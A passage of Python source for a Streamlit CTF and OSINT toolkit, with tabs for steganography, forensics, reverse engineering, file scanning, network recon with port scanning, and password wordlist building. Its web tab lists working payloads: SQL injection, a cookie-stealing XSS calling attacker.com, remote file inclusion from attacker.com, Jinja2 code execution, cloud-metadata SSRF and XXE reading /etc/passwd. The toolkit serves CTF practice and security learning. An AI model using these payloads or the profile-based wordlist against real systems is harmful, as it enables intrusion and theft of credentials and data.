            ("3️⃣ Binwalk", f"`binwalk -e {fname}`", "Extracts embedded files (ZIP, PNG, ELF…)."),
            ("4️⃣ Steghide", f'`steghide extract -sf {fname} -p ""`', "Common LSB stego tool. Try empty passphrase first."),
            ("5️⃣ zsteg (PNG/BMP)", f"`zsteg -a {fname}`", "Best for PNG bit-plane analysis."),
            ("6️⃣ exiftool", f"`exiftool {fname}`", "Check metadata for hidden comments/GPS/author."),
            ("7️⃣ StegSolve", "GUI tool — run locally", "Bit-plane viewer. Download from GitHub: *Caesum/StegSolve*."),
            ("8️⃣ Aperisolve", "→ [aperisolve.com](https://aperisolve.com)", "Online all-in-one: zsteg + steghide + binwalk + strings."),
        ]
        for title, cmd, tip in tools:
            st.markdown(f"""<div class='result-card'>
              <b>{title}</b><br>
              <span style='font-family:"Share Tech Mono",monospace;font-size:0.8rem;color:#00e5ff;'>{cmd}</span><br>
              <span style='color:rgba(160,200,240,0.6);font-size:0.78rem;'>{tip}</span>
            </div>""", unsafe_allow_html=True)

        st.markdown("#### 🌐 Online Tools")
        c1, c2, c3 = st.columns(3)
        c1.link_button("Aperisolve", "https://aperisolve.com", use_container_width=True)
        c2.link_button("StegOnline", "https://stegonline.georgeom.net/upload", use_container_width=True)
        c3.link_button("FotoForensics", "https://fotoforensics.com", use_container_width=True)

    # ── Web Exploitation ─────────────────────────────────────
    elif ctf_tab == "💉 Web Exploitation Payloads":
        wcat = st.radio("Category", ["SQL Injection","XSS","LFI/RFI","SSTI","SSRF","XXE"], horizontal=True)
        payloads = {
            "SQL Injection": [
                ("Basic bypass", "' OR '1'='1' --"),
                ("Comment bypass", "admin'--"),
                ("UNION columns probe", "' UNION SELECT NULL--  (increment NULLs until no error)"),
                ("Extract tables (MySQL)", "' UNION SELECT table_name,NULL FROM information_schema.tables--"),
                ("Extract columns", "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--"),
                ("Extract data", "' UNION SELECT username,password FROM users--"),
                ("Blind (boolean)", "' AND 1=1--  vs  ' AND 1=2--"),
                ("Time-based blind", "'; IF(1=1) WAITFOR DELAY '0:0:3'--"),
            ],
            "XSS": [
                ("Basic", "<script>alert(document.cookie)</script>"),
                ("IMG onerror", "<img src=x onerror=alert(1)>"),
                ("SVG", "<svg onload=alert(1)>"),
                ("Bypass filter", "<ScRiPt>alert(1)</ScRiPt>"),
                ("JS URI", "javascript:alert(1)"),
                ("Data URI", '<a href="data:text/html,<script>alert(1)</script>">click</a>'),
                ("Cookie steal", '<script>fetch("https://attacker.com/?c="+document.cookie)</script>'),
            ],
            "LFI/RFI": [
                ("Basic LFI", "?page=../../../../etc/passwd"),
                ("Null byte (old PHP)", "?page=../../../../etc/passwd%00"),
                ("PHP filter base64", "?page=php://filter/convert.base64-encode/resource=index.php"),
                ("Log poisoning setup", "Include malicious input in User-Agent, then include /var/log/apache2/access.log"),
                ("RFI", "?page=http://attacker.com/shell.txt"),
            ],
            "SSTI": [
                ("Detect (Jinja2)", "{{7*7}}  → expect 49"),
                ("Jinja2 RCE", "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
                ("Twig", "{{7*'7'}}  → 49 = Twig, 7777777 = Jinja2"),
                ("FreeMarker", "${7*7}"),
                ("Velocity", "#set($x=7*7)$x"),
            ],
            "SSRF": [
                ("Internal probe", "http://127.0.0.1:80/admin"),
                ("AWS metadata", "http://169.254.169.254/latest/meta-data/"),
                ("GCP metadata", "http://metadata.google.internal/computeMetadata/v1/"),
                ("Bypass filter", "http://0177.0.0.1/  or  http://[::1]/"),
                ("DNS rebinding", "Use rebind.it or similar tool"),
            ],
            "XXE": [
                ("Classic", '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'),
                ("Blind OOB", '<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;'),
                ("PHP filter", 'SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"'),
            ],
        }
        for label, payload in payloads.get(wcat, []):
            st.markdown(f"""<div class='result-card'>
              <b style='color:rgba(180,210,240,0.8);'>{label}</b><br>
              <code style='word-break:break-all;'>{payload}</code>
            </div>""", unsafe_allow_html=True)
        st.markdown("**Practice labs →**")
        lc1, lc2, lc3 = st.columns(3)
        lc1.link_button("HackTheBox", "https://app.hackthebox.com/challenges", use_container_width=True)
        lc2.link_button("PicoCTF", "https://picoctf.org/", use_container_width=True)
        lc3.link_button("PortSwigger", "https://portswigger.net/web-security", use_container_width=True)

    # ── Forensics & Volatility ────────────────────────────────
    elif ctf_tab == "🔬 Forensics & Volatility":
        fcat = st.radio("Category", ["File Carving","PCAP","Memory (Volatility 3)","Disk"], horizontal=True)
        fcommands = {
            "File Carving": [
                ("Detect file type", "file suspicious_file"),
                ("Foremost (carve all)", "foremost -i disk.img -o output/"),
                ("Scalpel", "scalpel disk.img -o carved/"),
                ("PhotoRec (GUI)", "photorec disk.img"),
                ("Extract ZIPs from binary", "binwalk -e --dd='zip:zip' file.bin"),
            ],
            "PCAP": [
                ("HTTP objects", "tshark -r cap.pcap --export-objects http,./out/"),
                ("Follow TCP stream", "tshark -r cap.pcap -q -z follow,tcp,ascii,0"),
                ("Extract creds", "tshark -r cap.pcap -Y 'http.request.method==POST' -T fields -e http.file_data"),
                ("DNS queries", "tshark -r cap.pcap -Y dns -T fields -e dns.qry.name"),
                ("Find flag string", "strings cap.pcap | grep -iE 'flag|CTF\\{|picoCTF'"),
                ("Wireshark filter (GUI)", "tcp contains 'flag'  or  http.request"),
            ],
            "Memory (Volatility 3)": [
                ("Image info", "python3 vol.py -f mem.dmp windows.info"),
                ("Process list", "python3 vol.py -f mem.dmp windows.pslist"),
                ("Process tree", "python3 vol.py -f mem.dmp windows.pstree"),
                ("Network conns", "python3 vol.py -f mem.dmp windows.netstat"),
                ("Dump process", "python3 vol.py -f mem.dmp windows.dumpfiles --pid 1234"),
                ("Registry hives", "python3 vol.py -f mem.dmp windows.registry.hivelist"),
                ("Cmdline args", "python3 vol.py -f mem.dmp windows.cmdline"),
                ("Malfind (injected)", "python3 vol.py -f mem.dmp windows.malfind"),
            ],
            "Disk": [
                ("Mount image", "sudo mount -o loop,ro disk.img /mnt/disk"),
                ("List partitions", "fdisk -l disk.img  or  mmls disk.img"),
                ("Autopsy (GUI)", "autopsy  # browser-based GUI at localhost:9999"),
                ("Strings search", "strings -a disk.img | grep -iE 'flag|password|secret'"),
                ("Recover deleted (ext4)", "extundelete disk.img --restore-all"),
            ],
        }
        for label, cmd in fcommands.get(fcat, []):
            st.markdown(f"""<div class='result-card'>
              <b style='color:rgba(180,210,240,0.8);'>{label}</b><br>
              <code style='word-break:break-all;font-size:0.8rem;'>{cmd}</code>
            </div>""", unsafe_allow_html=True)

    # ── Reverse Engineering ───────────────────────────────────
    elif ctf_tab == "⚙️ Reverse Engineering":
        recat = st.radio("Category", ["Static Analysis","Dynamic / GDB","Ghidra Tips","Python / Script RE"], horizontal=True)
        recmds = {
            "Static Analysis": [
                ("File type", "file ./binary"),
                ("Strings", "strings ./binary | grep -iE 'flag|key|pass|CTF'"),
                ("Symbols", "nm -an ./binary  or  readelf -s ./binary"),
                ("Sections", "readelf -S ./binary"),
                ("Disassemble (objdump)", "objdump -d -M intel ./binary | less"),
                ("Imports/exports", "objdump -p ./binary | grep -i import"),
                ("Security mitigations", "checksec --file=./binary"),
                ("Detect packers", "upx -t ./binary  or  Detect-It-Easy (DIE)"),
            ],
            "Dynamic / GDB": [
                ("Run with GDB", "gdb ./binary"),
                ("Disassemble main", "(gdb) disas main"),
                ("Set breakpoint", "(gdb) b *0x401234  or  b main"),
                ("Run / continue", "(gdb) r args    (gdb) c"),
                ("Print register", "(gdb) info registers  or  p $rax"),
                ("Examine memory", "(gdb) x/32xw $esp"),
                ("Pattern for overflow", "(gdb) pattern create 200   →   run   →   pattern offset $pc"),
                ("ltrace / strace", "ltrace ./binary   strace ./binary"),
            ],
            "Ghidra Tips": [
                ("Import & analyze", "File → Import File → Analysis → Auto Analyze"),
                ("Find main", "Symbol Tree → Functions → main"),
                ("Rename variable", "Right-click → Rename Variable (L)"),
                ("Patch instruction", "Right-click → Patch Instruction"),
                ("Script runner", "Window → Script Manager → run Python scripts"),
                ("Decompiler", "Right-click in listing → Decompile (Ctrl+E)"),
                ("Export C", "File → Export Program → C/C++ format"),
            ],
            "Python / Script RE": [
                ("Unpack Base64 layers", "import base64; d=base64.b64decode(data)"),
                ("Brute XOR key", "for k in range(256): print(bytes([b^k for b in data]))"),
                ("pwntools template", "from pwn import *\np=process('./binary')\np.sendline(b'A'*64+p64(0xdeadbeef))\np.interactive()"),
                ("Frida hook (Android)", "frida -U -l hook.js com.target.app"),
                ("angr symbolic exec", "import angr; p=angr.Project('./bin'); sim=p.factory.simgr(); sim.explore(find=0xaddr)"),
            ],
        }
        for label, cmd in recmds.get(recat, []):
            st.markdown(f"""<div class='result-card'>
              <b style='color:rgba(180,210,240,0.8);'>{label}</b><br>
              <code style='word-break:break-all;font-size:0.8rem;'>{cmd}</code>
            </div>""", unsafe_allow_html=True)
        st.markdown("**Resources →**")
        rc1, rc2, rc3 = st.columns(3)
        rc1.link_button("Ghidra", "https://ghidra-sre.org", use_container_width=True)
        rc2.link_button("pwntools docs", "https://docs.pwntools.com", use_container_width=True)
        rc3.link_button("CTF101 guide", "https://ctf101.org", use_container_width=True)

# ========== TAB 6: Deep File Scan (enhanced) ==========
with tab6:
    st.markdown("### 🔬 Deep File Scan – Aperisolve level")
    st.markdown("Upload any file to extract strings, entropy heatmap, embedded signatures, and flag patterns.")
    deep_file = st.file_uploader("Choose a file", type=["jpg","png","gif","bmp","pdf","zip","tar","bin","elf","exe","docx"], key="deep")
    if deep_file:
        file_bytes = deep_file.getvalue()
        fname = deep_file.name
        fsize = len(file_bytes)
        
        st.markdown(f"""
        <div class='glass-card'>
            <b>📄 Name:</b> {fname}<br>
            <b>📏 Size:</b> {fsize//1024} KB<br>
            <b>🔐 MD5:</b> <code>{hashlib.md5(file_bytes).hexdigest()}</code><br>
            <b>🔐 SHA256:</b> <code>{hashlib.sha256(file_bytes).hexdigest()[:32]}…</code>
        </div>
        """, unsafe_allow_html=True)
        
        if HAS_MAGIC:
            try:
                mime = magic.from_buffer(file_bytes[:2048])
                st.markdown(f"**📌 Type:** `{mime}`")
            except:
                pass
        
        if fsize > 0:
            freq = Counter(file_bytes)
            probs = [freq[b]/fsize for b in freq]
            entropy = -sum(p * math.log2(p) for p in probs if p > 0)
            st.markdown(f"**📊 Entropy:** {entropy:.2f} bits/byte (high → encrypted/compressed)")
            
            st.markdown("**📈 Entropy heatmap (64 blocks)**")
            block_size = max(1, fsize//64)
            entropies = []
            for i in range(0, fsize, block_size):
                block = file_bytes[i:i+block_size]
                if block:
                    fq = Counter(block)
                    pv = [fq[b]/len(block) for b in fq]
                    e = -sum(p * math.log2(p) for p in pv if p>0) if len(block) > 0 else 0
                    entropies.append(e)
            cols = st.columns(min(64, len(entropies)))
            for idx, e in enumerate(entropies[:64]):
                color = f"hsl({int(240 - e*120)}, 80%, 50%)"
                cols[idx].markdown(f"<div style='background:{color}; height:24px; width:100%; border-radius:6px;' title='{e:.2f}'></div>", unsafe_allow_html=True)
        
        with st.expander("🔤 Extracted ASCII strings (first 2000 chars)"):
            strings = re.findall(b'[\\x20-\\x7E]{4,}', file_bytes)
            unique = list(set(s.decode('ascii', errors='ignore') for s in strings))[:100]
            st.code('\n'.join(unique[:50]))
        
        with st.expander("🗂️ Embedded file signatures"):
            sigs = {
                b'PK\x03\x04': 'ZIP archive',
                b'\x89PNG\r\n\x1a\n': 'PNG image',
                b'\xff\xd8\xff': 'JPEG image',
                b'%PDF': 'PDF document',
                b'\x7fELF': 'ELF executable',
                b'MZ': 'PE executable',
                b'GIF8': 'GIF image',
                b'RIFF': 'RIFF container (AVI/WAV)',
                b'OggS': 'Ogg stream',
                b'FLIF': 'FLIF image',
                b'\x1f\x8b': 'GZIP archive',
                b'BZ': 'BZIP2 archive',
                b'7z\xbc\xaf\x27\x1c': '7-Zip archive',
                b'Rar!': 'RAR archive',
                b'<!DOCTYPE html': 'HTML document',
            }
            found = []
            for sig, desc in sigs.items():
                idx = file_bytes.find(sig)
                if idx != -1:
                    found.append(f"- {desc} at offset {idx}")
            if found:
                st.markdown('\n'.join(found))
            else:
                st.markdown("No common embedded headers detected.")
        
        with st.expander("🏴 Flag pattern search"):
            patterns = [
                r'flag\{[^}]+\}', r'FLAG\{[^}]+\}', r'ctf\{[^}]+\}',
                r'key\{[^}]+\}', r'secret\{[^}]+\}', r'password\{[^}]+\}',
                r'[A-Za-z0-9]{32}', r'[A-F0-9]{32}', r'[a-f0-9]{64}'
            ]
            matches = []
            for pat in patterns:
                found = re.findall(pat.encode(), file_bytes, re.IGNORECASE)
                matches.extend([f.decode(errors='ignore') for f in found])
            if matches:
                st.success("✅ Potential flags found:")
                for m in set(matches):
                    st.code(m)
            else:
                st.info("No obvious flag patterns found.")
        
        with st.expander("🕵️ Steganography commands to try locally"):
            st.code(f"""
steghide extract -sf {fname} -p ""
zsteg -a {fname}
binwalk -e {fname}
strings {fname} | grep -iE 'flag|secret'
            """)
        
        st.download_button("📥 Download extracted strings", "\n".join(unique[:500]), file_name="strings.txt", mime="text/plain")

# ========== TAB 7: Network Recon ==========
with tab7:
    st.markdown("### 🌐 Network Reconnaissance")
    target = st.text_input("Target (IP or domain)", placeholder="8.8.8.8 or example.com", key="recon_target")
    col_a, col_b = st.columns(2)
    check_ports = col_a.checkbox("Port scan (top 20)", value=False)
    check_whois = col_b.checkbox("WHOIS lookup", value=True)

    if st.button("🚀 Start Recon", use_container_width=True) and target:
        t = target.strip()
        is_ip = bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', t))

        # Resolve IP
        resolved_ip = t if is_ip else None
        if not is_ip:
            try:
                resolved_ip = socket.gethostbyname(t)
            except:
                pass

        st.markdown(f"""
        <div class='glass-card'>
          <b>🎯 Target:</b> {t}<br>
          {"<b>🔗 Resolved IP:</b> <code>" + resolved_ip + "</code>" if resolved_ip and not is_ip else ""}
        </div>""", unsafe_allow_html=True)

        # DNS records
        st.markdown("#### 🌍 DNS Records")
        dns_cols = st.columns(2)
        dns_left = []
        dns_right = []
        for rtype in ['A','AAAA','MX','NS','TXT','CNAME','SOA']:
            try:
                ans = dns.resolver.resolve(t, rtype, lifetime=4)
                for rec in ans:
                    val = str(rec)[:120]
                    entry = f"<div class='result-card'><code>{rtype}</code> {val}</div>"
                    (dns_left if len(dns_left) <= len(dns_right) else dns_right).append(entry)
            except:
                pass
        with dns_cols[0]: st.markdown("".join(dns_left), unsafe_allow_html=True)
        with dns_cols[1]: st.markdown("".join(dns_right), unsafe_allow_html=True)

        # Geolocation
        if resolved_ip:
            st.markdown("#### 📍 IP Geolocation")
            try:
                geo = requests.get(f"http://ip-api.com/json/{resolved_ip}?fields=status,country,countryCode,regionName,city,zip,lat,lon,isp,org,as,reverse", timeout=5).json()
                if geo.get('status') == 'success':
                    gcols = st.columns(3)
                    gcols[0].markdown(f"""<div class='glass-card'>
                        🌍 <b>{geo.get('country')} ({geo.get('countryCode')})</b><br>
                        📍 {geo.get('city')}, {geo.get('regionName')} {geo.get('zip','')}
                    </div>""", unsafe_allow_html=True)
                    gcols[1].markdown(f"""<div class='glass-card'>
                        🏢 <b>ISP:</b> {geo.get('isp')}<br>
                        🔧 <b>Org:</b> {geo.get('org')}
                    </div>""", unsafe_allow_html=True)
                    gcols[2].markdown(f"""<div class='glass-card'>
                        📡 <b>ASN:</b> {geo.get('as','?')}<br>
                        🔁 <b>rDNS:</b> {geo.get('reverse','N/A')}
                    </div>""", unsafe_allow_html=True)
                    st.map(data=[{"lat": geo['lat'], "lon": geo['lon']}], zoom=5)
            except Exception as e:
                st.info(f"Geo lookup failed: {e}")

        # Port scan
        if check_ports and resolved_ip:
            st.markdown("#### 🔌 Port Scan (top 20)")
            TOP_PORTS = [21,22,23,25,53,80,110,143,443,445,3306,3389,5432,6379,8080,8443,8888,9200,27017,6443]
            open_ports = []
            prog = st.progress(0)
            for i, port in enumerate(TOP_PORTS):
                prog.progress((i+1)/len(TOP_PORTS))
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.8)
                    if s.connect_ex((resolved_ip, port)) == 0:
                        open_ports.append(port)
                    s.close()
                except:
                    pass
            prog.empty()
            SVCMAP = {21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',110:'POP3',
                      143:'IMAP',443:'HTTPS',445:'SMB',3306:'MySQL',3389:'RDP',5432:'Postgres',
                      6379:'Redis',8080:'HTTP-Alt',8443:'HTTPS-Alt',8888:'Jupyter',
                      9200:'Elasticsearch',27017:'MongoDB',6443:'K8s API'}
            if open_ports:
                for p in open_ports:
                    st.markdown(f"<div class='result-card'>🟢 <code>{p}</code> — {SVCMAP.get(p, 'unknown')}</div>", unsafe_allow_html=True)
            else:
                st.info("No open ports found in top 20.")

        # WHOIS
        if check_whois and not is_ip:
            st.markdown("#### 📋 WHOIS")
            st.link_button("WHOIS Lookup →", f"https://who.is/whois/{t}", use_container_width=False)

        # Threat intel links
        st.markdown("#### 🛡️ Threat Intelligence")
        intel_cols = st.columns(4)
        ref = resolved_ip or t
        intel_cols[0].link_button("VirusTotal", f"https://www.virustotal.com/gui/{'ip-address' if is_ip else 'domain'}/{ref}", use_container_width=True)
        intel_cols[1].link_button("Shodan", f"https://www.shodan.io/host/{ref}" if is_ip else f"https://www.shodan.io/search?query=hostname:{t}", use_container_width=True)
        intel_cols[2].link_button("SecurityTrails", f"https://securitytrails.com/domain/{t}/dns", use_container_width=True)
        intel_cols[3].link_button("Censys", f"https://search.censys.io/hosts/{ref}" if is_ip else f"https://search.censys.io/certificates?q={t}", use_container_width=True)

        # Subdomain enum commands
        with st.expander("🔍 Subdomain enumeration commands"):
            st.code(f"""
subfinder -d {t} -o subs.txt
amass enum -passive -d {t}
dnsrecon -d {t} -t brt -D /usr/share/wordlists/dnsmap.txt
dnsx -l subs.txt -resp -a -aaaa -mx -ns
            """)

# ========== TAB 8: Password Intel ==========
with tab8:
    st.markdown("### 🔑 Password Intelligence")
    st.markdown("Analyze password strength, generate wordlists, and check hash formats — all offline.")

    pw_mode = st.radio("Mode", ["Strength Analyzer", "Hash Generator", "Wordlist Builder"], horizontal=True)

    if pw_mode == "Strength Analyzer":
        pw = st.text_input("Password to analyze", type="password", placeholder="Enter any password")
        if pw:
            length = len(pw)
            has_upper = bool(re.search(r'[A-Z]', pw))
            has_lower = bool(re.search(r'[a-z]', pw))
            has_digit = bool(re.search(r'\d', pw))
            has_sym   = bool(re.search(r'[^A-Za-z0-9]', pw))
            charset   = (26 if has_lower else 0) + (26 if has_upper else 0) + (10 if has_digit else 0) + (32 if has_sym else 0)
            entropy   = round(length * math.log2(charset), 1) if charset else 0
            score     = sum([length >= 8, length >= 12, has_upper, has_lower, has_digit, has_sym])
            label     = ["Very Weak","Weak","Fair","Good","Strong","Very Strong"][min(score,5)]
            color     = ["#ff3b30","#ff9500","#ffcc00","#34c759","#007aff","#5856d6"][min(score,5)]

            st.markdown(f"""
            <div class='glass-card'>
              <div style='font-family:"Share Tech Mono",monospace;font-size:1.5rem;color:{color};font-weight:700;'>{label}</div>
              <div style='margin:8px 0;background:rgba(255,255,255,0.06);border-radius:50px;height:8px;overflow:hidden;'>
                <div style='width:{score/5*100}%;height:100%;background:{color};border-radius:50px;transition:width 0.6s ease;'></div>
              </div>
              <b>Length:</b> {length} chars &nbsp;|&nbsp; <b>Entropy:</b> {entropy} bits &nbsp;|&nbsp; <b>Charset:</b> {charset}
            </div>
            """, unsafe_allow_html=True)

            checks = [
                (has_upper, "Uppercase letters"),
                (has_lower, "Lowercase letters"),
                (has_digit, "Numbers"),
                (has_sym,   "Symbols"),
                (length >= 8,  "At least 8 characters"),
                (length >= 16, "16+ characters (great)"),
            ]
            for ok, label in checks:
                icon = "✅" if ok else "❌"
                st.markdown(f"{icon} {label}")

            # Common password check
            COMMON = {"password","123456","qwerty","letmein","admin","welcome","monkey","dragon","master","sunshine"}
            if pw.lower() in COMMON:
                st.error("⚠️ This is one of the most common passwords. Change it immediately.")

    elif pw_mode == "Hash Generator":
        text = st.text_input("Text to hash", placeholder="hello world")
        if text:
            enc = text.encode()
            hashes = {
                "MD5":    hashlib.md5(enc).hexdigest(),
                "SHA-1":  hashlib.sha1(enc).hexdigest(),
                "SHA-256":hashlib.sha256(enc).hexdigest(),
                "SHA-512":hashlib.sha512(enc).hexdigest(),
                "SHA-384":hashlib.sha384(enc).hexdigest(),
            }
            for algo, val in hashes.items():
                st.markdown(f"<div class='result-card'><code>{algo}</code><br><small style='color:#00e5ff;word-break:break-all;'>{val}</small></div>", unsafe_allow_html=True)
            st.markdown(f"<div class='result-card'><code>Base64</code><br><small style='color:#00e5ff;'>{base64.b64encode(enc).decode()}</small></div>", unsafe_allow_html=True)

    elif pw_mode == "Wordlist Builder":
        st.markdown("Generate a targeted wordlist from personal info (for authorized pen-testing only).")
        name    = st.text_input("Name", placeholder="john smith")
        dob     = st.text_input("Date of birth", placeholder="19900115")
        keyword = st.text_input("Keywords (comma-separated)", placeholder="dog,company,city")
        if st.button("Generate Wordlist", use_container_width=True) and (name or keyword):
            words = set()
            parts = name.lower().split() if name else []
            for p in parts:
                words.update([p, p.capitalize(), p+"123", p+"1", p+"!", p+"2024", p+"2025"])
            if len(parts) >= 2:
                words.update([parts[0]+parts[1], parts[0]+"."+parts[1], parts[0][0]+parts[1]])
            if dob:
                for p in parts:
                    words.update([p+dob, p+dob[-4:], p+dob[-2:]])
            for kw in (keyword.split(",") if keyword else []):
                kw = kw.strip().lower()
                words.update([kw, kw.capitalize(), kw+"123", kw+"!", kw+"2024", kw+"2025", kw+"1"])
            words.discard("")
            wl = "\n".join(sorted(words))
            st.success(f"✅ {len(words)} candidates generated")
            st.code(wl[:2000])
            st.download_button("📥 Download wordlist.txt", wl, file_name="wordlist.txt", mime="text/plain")

# ========== FOOTER ==========
st.markdown("""
<div style='text-align:center;padding:2rem 0 1rem;'>
  <div style='
    display:inline-block;
    background:linear-gradient(135deg,rgba(255,255,255,0.05),rgba(255,255,255,0.02));
    backdrop-filter:blur(20px);
    border:1px solid rgba(255,255,255,0.08);
    border-radius:50px;
    padding:8px 24px;
    font-family:"Share Tech Mono",monospace;
    font-size:0.65rem;
    color:rgba(120,160,200,0.6);
    letter-spacing:0.12em;
  '>
    🕵️ OSINT SUITE PRO &nbsp;·&nbsp; REAL DATA ONLY &nbsp;·&nbsp; NO SIMULATION &nbsp;·&nbsp; v2.0 · 2026
  </div>
</div>
""", unsafe_allow_html=True)
